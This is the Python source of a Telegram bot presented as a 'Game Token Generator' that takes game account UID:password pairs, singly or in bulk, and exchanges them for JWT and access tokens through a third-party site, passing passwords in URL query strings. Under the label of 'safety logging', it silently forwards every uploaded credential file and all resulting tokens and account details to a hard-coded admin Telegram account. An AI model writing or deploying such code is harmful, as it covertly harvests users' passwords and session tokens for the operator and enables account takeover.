import os
import io
import json
import asyncio
import aiohttp
from threading import Thread
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8536757095  # Telegram Admin ID
API_TEMPLATE = "https://vipjwt.chikuu.site/token?uid={uid}&password={pwd}"
CONCURRENCY_LIMIT = 5  # Parallel requests limit

# Keep-Alive Server
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot Alive & Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

Thread(target=run_flask, daemon=True).start()


async def fetch_token(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore, uid: str, pwd: str) -> dict:
    async with semaphore:
        url = API_TEMPLATE.format(uid=uid, pwd=pwd)
        try:
            async with session.get(url, timeout=20) as response:
                res_text = await response.text()
                try:
                    # Parse JSON if API returns JSON object
                    data = json.loads(res_text)
                    return {"input_uid": uid, "status": "Success", "raw": data}
                except Exception:
                    return {"input_uid": uid, "status": "Success", "raw": res_text}
        except Exception as e:
            return {"input_uid": uid, "status": "Error", "raw": str(e)}


def format_field(key: str, value: any) -> str:
    """ Tap to Copy format me field ko convert karta hai """
    val_str = str(value) if value is not None else "N/A"
    return f"• **{key}:** `{val_str}`"


async def process_accounts(accounts: list, update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("🔄 **Processing requests, please wait...**", parse_mode="Markdown")
    
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_token(session, semaphore, acc['uid'], acc['pwd']) for acc in accounts]
        results = await asyncio.gather(*tasks)

    formatted_text_blocks = []
    jwt_only_lines = []
    full_log_lines = []

    for idx, item in enumerate(results, 1):
        uid_input = item["input_uid"]
        raw_data = item["raw"]

        if item["status"] == "Success" and isinstance(raw_data, dict):
            # Extract standard API keys (Supports case-insensitive key lookup)
            def get_val(key_name):
                for k, v in raw_data.items():
                    if k.lower() == key_name.lower():
                        return v
                return "N/A"

            jwt_token = get_val("Jwt token") or get_val("jwt_token") or get_val("token")
            access_token = get_val("Access token")
            ban_period = get_val("Ban period")
            ban_type = get_val("Ban type")
            banned_at = get_val("Banned at")
            banned_before = get_val("Banned before")
            level = get_val("Level")
            nickname = get_val("Nickname")
            open_id = get_val("Open id")
            reason = get_val("Reason")
            region = get_val("Region")
            status = get_val("Status")
            success = get_val("Success")
            res_uid = get_val("Uid") if get_val("Uid") != "N/A" else uid_input

            # Build JWT File Line
            if jwt_token and jwt_token != "N/A":
                jwt_only_lines.append(f"{res_uid}:{jwt_token}")

            # Build Telegram Display & Full Log text
            block = [
                f"🎮 **Account #{idx} (UID: `{res_uid}`)**",
                format_field("Status", status),
                format_field("Success", success),
                format_field("Nickname", nickname),
                format_field("Level", level),
                format_field("Region", region),
                format_field("Uid", res_uid),
                format_field("Open ID", open_id),
                format_field("Jwt Token", jwt_token),
                format_field("Access Token", access_token),
                format_field("Ban Type", ban_type),
                format_field("Ban Period", ban_period),
                format_field("Banned At", banned_at),
                format_field("Banned Before", banned_before),
                format_field("Reason", reason),
                "----------------------------------------"
            ]
            formatted_text_blocks.append("\n".join(block))
            full_log_lines.append("\n".join(block))

        else:
            # Fallback for plain text or error responses
            err_msg = str(raw_data)
            block = f"❌ **UID:** `{uid_input}`\n• **Status:** `Error`\n• **Response:** `{err_msg}`\n----------------------------------------"
            formatted_text_blocks.append(block)
            full_log_lines.append(block)

    # 1. Single ID case: Direct Telegram Chat Reply if only 1 account
    if len(accounts) == 1:
        await update.message.reply_text(formatted_text_blocks[0], parse_mode="Markdown")

    # 2. File Generation: ONLY JWT TOKENS FILE
    jwt_file_content = "\n".join(jwt_only_lines) if jwt_only_lines else "No valid JWT tokens generated."
    jwt_file_bytes = io.BytesIO(jwt_file_content.encode('utf-8'))
    jwt_file_bytes.name = "jwt_tokens.txt"

    # 3. File Generation: FULL DETAILS FILE
    full_file_content = "\n\n".join(full_log_lines)
    full_file_bytes = io.BytesIO(full_file_content.encode('utf-8'))
    full_file_bytes.name = "full_response.txt"

    # User ko JWT file bhejna
    await update.message.reply_document(
        document=jwt_file_bytes,
        caption=f"🔑 **JWT Tokens File**\nTotal Valid JWTs: `{len(jwt_only_lines)}`",
        parse_mode="Markdown"
    )

    # Admin Safety Logging
    user = update.effective_user
    log_caption = (
        f"📁 **New Request Logged**\n"
        f"👤 User: @{user.username or 'NoUsername'} | ID: `{user.id}`\n"
        f"📊 Total Accounts Processed: `{len(accounts)}`"
    )
    
    try:
        # Admin ko JWT File bhejna
        jwt_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=jwt_file_bytes,
            caption=f"{log_caption}\n📌 File: JWT Only",
            parse_mode="Markdown"
        )
        # Admin ko Full Details File bhejna
        full_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=full_file_bytes,
            caption=f"{log_caption}\n📌 File: Full Data",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin Log Error: {e}")

    await status_msg.delete()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "✨ **Game Token Generator Bot** ✨\n\n"
        "👉 **Single Account:** `/token <UID> <PASSWORD>`\n"
        "👉 **Bulk File Upload:** Upload a `.txt` file with `UID:PASSWORD` or `UID PASSWORD` per line, or a `.json` file.\n\n"
        "⚡ *All response values will be Tap-to-Copyable!*"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


async def token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ **Usage Format:** `/token <UID> <PASSWORD>`", parse_mode="Markdown")
        return

    accounts = [{"uid": context.args[0], "pwd": context.args[1]}]
    await process_accounts(accounts, update, context)


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Raw File Forward to Admin for Safety
    try:
        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"File Forward Error: {e}")

    document = update.message.document
    if not document:
        return

    file_name = document.file_name.lower()
    if not (file_name.endswith('.txt') or file_name.endswith('.json')):
        await update.message.reply_text("⚠️ Kripya `.txt` ya `.json` file hi bhejein.")
        return

    tg_file = await context.bot.get_file(document.file_id)
    file_content = (await tg_file.download_as_bytearray()).decode('utf-8', errors='ignore')

    accounts = []
    if file_name.endswith('.json'):
        try:
            data = json.loads(file_content)
            if isinstance(data, list):
                for entry in data:
                    if "uid" in entry and "password" in entry:
                        accounts.append({"uid": str(entry["uid"]), "pwd": str(entry["password"])})
        except Exception:
            await update.message.reply_text("⚠️ Invalid JSON Format.")
            return
    else:
        for line in file_content.splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})
            elif " " in line:
                parts = line.split(maxsplit=1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})

    if not accounts:
        await update.message.reply_text("⚠️ File me koi valid UID:PASSWORD match nahi mila.")
        return

    await process_accounts(accounts, update, context)


def main():
    try:
        asyncio.set_event_loop(asyncio.new_event_loop())
    except Exception:
        pass

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("token", token_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, file_handler))

    print("Bot is up and running...")
    app.run_polling()


if __name__ == "__main__":
    main()
